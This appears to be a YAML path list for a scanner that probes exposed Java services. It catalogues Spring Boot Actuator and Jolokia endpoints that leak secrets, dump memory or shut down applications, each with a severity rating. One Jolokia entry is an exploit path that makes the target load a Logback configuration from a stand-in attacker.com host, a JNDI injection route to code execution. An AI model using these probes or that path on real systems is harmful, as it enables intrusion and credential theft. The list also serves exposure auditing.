# Java Service Path Scanner - Path Database
# Organized by technology for targeted scanning

spring_boot_actuator:
  description: "Spring Boot Actuator endpoints (1.x and 2.x)"
  paths:
    # Spring Boot 2.x (prefixed)
    - path: "/actuator"
      info: "Actuator index - lists all enabled endpoints"
      severity: "medium"
    - path: "/actuator/env"
      info: "Environment properties - may contain secrets, DB credentials, API keys"
      severity: "critical"
    - path: "/actuator/health"
      info: "Health check - reveals internal service status and dependencies"
      severity: "low"
    - path: "/actuator/beans"
      info: "All Spring beans - reveals internal architecture"
      severity: "medium"
    - path: "/actuator/configprops"
      info: "Configuration properties - may contain secrets"
      severity: "critical"
    - path: "/actuator/heapdump"
      info: "JVM heap dump - contains in-memory secrets, session tokens"
      severity: "critical"
    - path: "/actuator/threaddump"
      info: "Thread dump - reveals internal operations and stack traces"
      severity: "medium"
    - path: "/actuator/loggers"
      info: "Logger configuration - can be modified to enable debug logging"
      severity: "medium"
    - path: "/actuator/mappings"
      info: "All URL mappings - reveals hidden API endpoints"
      severity: "high"
    - path: "/actuator/shutdown"
      info: "Shutdown endpoint - can shut down the application (POST)"
      severity: "critical"
    - path: "/actuator/jolokia"
      info: "Jolokia JMX bridge - potential RCE via MBean operations"
      severity: "critical"
    - path: "/actuator/gateway/routes"
      info: "Spring Cloud Gateway routes - potential SSRF via SpEL"
      severity: "critical"
    - path: "/actuator/gateway/globalfilters"
      info: "Gateway global filters configuration"
      severity: "medium"
    - path: "/actuator/gateway/routefilters"
      info: "Gateway route filters configuration"
      severity: "medium"
    - path: "/actuator/caches"
      info: "Cache manager details"
      severity: "low"
    - path: "/actuator/conditions"
      info: "Auto-configuration conditions evaluation"
      severity: "medium"
    - path: "/actuator/flyway"
      info: "Flyway database migration info"
      severity: "medium"
    - path: "/actuator/httptrace"
      info: "HTTP trace - recent request/response pairs with headers"
      severity: "high"
    - path: "/actuator/info"
      info: "Application info - may reveal version, git commit, build info"
      severity: "low"
    - path: "/actuator/liquibase"
      info: "Liquibase database migration info"
      severity: "medium"
    - path: "/actuator/metrics"
      info: "Application metrics"
      severity: "low"
    - path: "/actuator/prometheus"
      info: "Prometheus metrics export"
      severity: "low"
    - path: "/actuator/scheduledtasks"
      info: "Scheduled task details"
      severity: "low"
    - path: "/actuator/sessions"
      info: "Session management - list/delete user sessions"
      severity: "high"
    - path: "/actuator/startup"
      info: "Application startup steps"
      severity: "low"
    - path: "/actuator/refresh"
      info: "Refresh application context (POST)"
      severity: "high"
    - path: "/actuator/restart"
      info: "Restart application (POST)"
      severity: "critical"
    - path: "/actuator/pause"
      info: "Pause application (POST)"
      severity: "high"
    - path: "/actuator/resume"
      info: "Resume application (POST)"
      severity: "medium"

    # Spring Boot 1.x (unprefixed)
    - path: "/env"
      info: "Environment properties (Spring Boot 1.x)"
      severity: "critical"
    - path: "/env.json"
      info: "Environment properties as JSON"
      severity: "critical"
    - path: "/health"
      info: "Health check (Spring Boot 1.x)"
      severity: "low"
    - path: "/info"
      info: "Application info (Spring Boot 1.x)"
      severity: "low"
    - path: "/metrics"
      info: "Application metrics (Spring Boot 1.x)"
      severity: "low"
    - path: "/trace"
      info: "HTTP trace (Spring Boot 1.x)"
      severity: "high"
    - path: "/dump"
      info: "Thread dump (Spring Boot 1.x)"
      severity: "medium"
    - path: "/beans"
      info: "Spring beans (Spring Boot 1.x)"
      severity: "medium"
    - path: "/autoconfig"
      info: "Auto-configuration report (Spring Boot 1.x)"
      severity: "medium"
    - path: "/configprops"
      info: "Configuration properties (Spring Boot 1.x)"
      severity: "critical"
    - path: "/mappings"
      info: "URL mappings (Spring Boot 1.x)"
      severity: "high"
    - path: "/heapdump"
      info: "Heap dump (Spring Boot 1.x)"
      severity: "critical"

  # Common context path variants
  context_prefixes:
    - ""
    - "/api"
    - "/app"
    - "/application"
    - "/manage"
    - "/management"
    - "/admin"
    - "/internal"
    - "/monitoring"
    - "/system"

jolokia:
  description: "Jolokia JMX HTTP bridge"
  paths:
    - path: "/jolokia"
      info: "Jolokia index - JMX over HTTP"
      severity: "critical"
    - path: "/jolokia/list"
      info: "List all available MBeans"
      severity: "high"
    - path: "/jolokia/exec"
      info: "Execute MBean operations - potential RCE"
      severity: "critical"
    - path: "/jolokia/read"
      info: "Read MBean attributes"
      severity: "high"
    - path: "/jolokia/read/java.lang:type=Runtime/ClassPath"
      info: "Read JVM classpath"
      severity: "medium"
    - path: "/jolokia/read/java.lang:type=Runtime/SystemProperties"
      info: "Read JVM system properties"
      severity: "high"
    - path: "/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/attacker.com!/logback.xml"
      info: "Logback JNDI injection via Jolokia"
      severity: "critical"
    - path: "/jolokia/version"
      info: "Jolokia version information"
      severity: "low"

